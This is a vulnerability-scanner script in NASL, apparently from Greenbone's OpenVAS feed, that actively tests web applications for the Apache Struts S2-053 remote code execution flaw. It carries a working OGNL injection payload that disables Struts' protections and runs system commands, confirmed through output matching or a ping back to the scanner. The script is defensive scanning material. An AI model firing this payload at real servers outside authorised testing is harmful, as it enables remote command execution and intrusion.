# Copyright (C) 2017 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108243");
  script_version("2021-04-06T09:08:12+0000");
  script_cve_id("CVE-2017-12611");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2021-04-06 10:08:15 +0000 (Tue, 06 Apr 2021)");
  script_tag(name:"creation_date", value:"2017-09-11 12:00:00 +0200 (Mon, 11 Sep 2017)");
  script_name("Apache Struts RCE Vulnerability (S2-053) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning", "global_settings/disable_generic_webapp_scanning");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-053");
  script_xref(name:"Advisory-ID", value:"S2-053");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the
  response.

  NOTE: This script needs to check every parameter of a web application with various
  crafted requests. This is a time-consuming process and this script won't run by default.
  If you want to check for this vulnerability please enable 'Enable generic web
  application scanning' within the script preferences of the VT 'Global variable settings
  (OID: 1.3.6.1.4.1.25623.1.0.12288)'.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an
  attacker to execute arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"Apache Struts 2.0.0 through 2.3.33 and 2.5 through
  2.5.10.1.");

  script_tag(name:"solution", value:"Update to version 2.3.34, 2.5.12 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("url_func.inc");

# nb: We also don't want to run if optimize_test is set to "no"
if( http_is_cgi_scan_disabled() ||
    get_kb_item( "global_settings/disable_generic_webapp_scanning" ) )
  exit( 0 );

port = http_get_port( default:80 );
host = http_host_name( dont_add_port:TRUE );

cgis = http_get_kb_cgis( port:port, host:host );
if( ! cgis )
  exit( 0 );

foreach cgi( cgis ) {

  cgiArray = split( cgi, sep:" ", keep:FALSE );

  cmds = exploit_commands();

  foreach cmd( keys( cmds ) ) {

    c = "{'" + cmds[ cmd ] + "'}";

    ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" +
         "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." +
         "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." +
         "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
         "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

    urls = http_create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
    foreach url( urls ) {

      req = http_get_req( port:port, url:url );
      buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

      if( egrep( pattern:cmd, string:buf ) ) {
        report = 'It was possible to execute the command `' + cmds[ cmd ] + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

foreach cgi( cgis ) {

  if( host_runs( "Windows" ) == "yes" ) {
    cleancmd = "ping -n 3 " + this_host();
    pingcmd = '"ping","-n","3","' + this_host() + '"';
    win = TRUE;
  } else {
    vtstrings = get_vt_strings();
    check = vtstrings["ping_string"];
    pattern = hexstr( check );
    cleancmd = "ping -c 3 -p " + pattern + " " + this_host();
    pingcmd = '"ping","-c","3","-p","' + pattern + '","' + this_host() + '"';
  }

  c = "{" + pingcmd + "}";

  ex = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):" +
       "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com." +
       "opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses()." +
       "clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder(" + c + "))." +
       "(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

  cgiArray = split( cgi, sep:" ", keep:FALSE );

  urls = http_create_exploit_req( cgiArray:cgiArray, ex:urlencode( str:ex ) );
  foreach url( urls ) {

    req = http_get_req( port:port, url:url );
    res = send_capture( socket:soc, data:req, timeout:2, pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
    if( ! res )
      continue;

    data = get_icmp_element( icmp:res, element:"data" );
    if( data && ( win || check >< data ) ) {
      close( soc );
      report = 'It was possible to execute the command `' + cleancmd + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + data;
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

close( soc );
exit( 0 );
